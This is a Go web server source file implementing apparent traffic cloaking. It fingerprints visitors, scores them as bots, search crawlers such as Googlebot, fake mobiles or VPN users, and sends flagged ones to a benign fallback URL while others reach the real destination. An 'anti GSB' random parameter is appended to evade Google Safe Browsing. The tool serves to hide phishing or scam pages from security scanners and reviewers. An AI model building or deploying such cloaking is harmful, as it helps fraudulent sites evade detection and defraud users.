package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

type FPData struct {
	Webdriver bool   `json:"webdriver"`
	Lang      string `json:"lang"`
	Platform  string `json:"platform"`
	Screen    string `json:"screen"`
	TZ        string `json:"tz"`
}

func isBotUA(ua string) bool {
	bots := []string{"bot", "crawler", "spider", "curl", "wget", "python"}
	for _, b := range bots {
		if strings.Contains(ua, b) {
			return true
		}
	}
	return false
}

func isCrawler(ua string) bool {
	crawlers := []string{"googlebot", "bingbot", "yandex", "duckduckbot"}
	for _, c := range crawlers {
		if strings.Contains(ua, c) {
			return true
		}
	}
	return false
}

func isFakeMobile(ua string) bool {
	if strings.Contains(ua, "iphone") && strings.Contains(ua, "windows") {
		return true
	}
	return false
}

// VPN API check
func checkVPN(ip string) bool {
	client := &http.Client{Timeout: 2 * time.Second}

	resp, err := client.Get("https://ipapi.is/?q=" + ip)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	var data map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&data)

	if v, ok := data["is_vpn"].(bool); ok {
		return v
	}

	return false
}

// FP handler
func fpHandler(w http.ResponseWriter, r *http.Request) {

	var body struct {
		FP FPData `json:"fp"`
		DL string `json:"dl"`
		BL string `json:"bl"`
	}

	json.NewDecoder(r.Body).Decode(&body)

	ua := strings.ToLower(body.FP.Platform)
	ip := r.RemoteAddr

	score := 0

	if body.FP.Webdriver {
		score += 60
	}

	if body.FP.TZ == "" {
		score += 30
	}

	if isBotUA(ua) {
		score += 40
	}

	if isCrawler(ua) {
		score += 50
	}

	if isFakeMobile(ua) {
		score += 40
	}

	if checkVPN(ip) {
		score += 30
	}

	mode := os.Getenv("MODE")

	limit := 60

	if mode == "light" {
		limit = 80
	}
	if mode == "paranoid" {
		limit = 40
	}

	redirect := body.DL

	if redirect == "" {
		redirect = "https://google.com"
	}

	if body.BL == "" {
		body.BL = "https://example.com"
	}

	if score >= limit {
		redirect = body.BL
	}

	// anti GSB random param
	if strings.Contains(redirect, "?") {
		redirect = redirect + "&r=" + fmt.Sprint(time.Now().UnixNano())
	} else {
		redirect = redirect + "?r=" + fmt.Sprint(time.Now().UnixNano())
	}
	json.NewEncoder(w).Encode(map[string]string{
		"redirect": redirect,
	})
}

func main() {

	http.HandleFunc("/fp", fpHandler)

	http.ListenAndServe(":8080", nil)
}
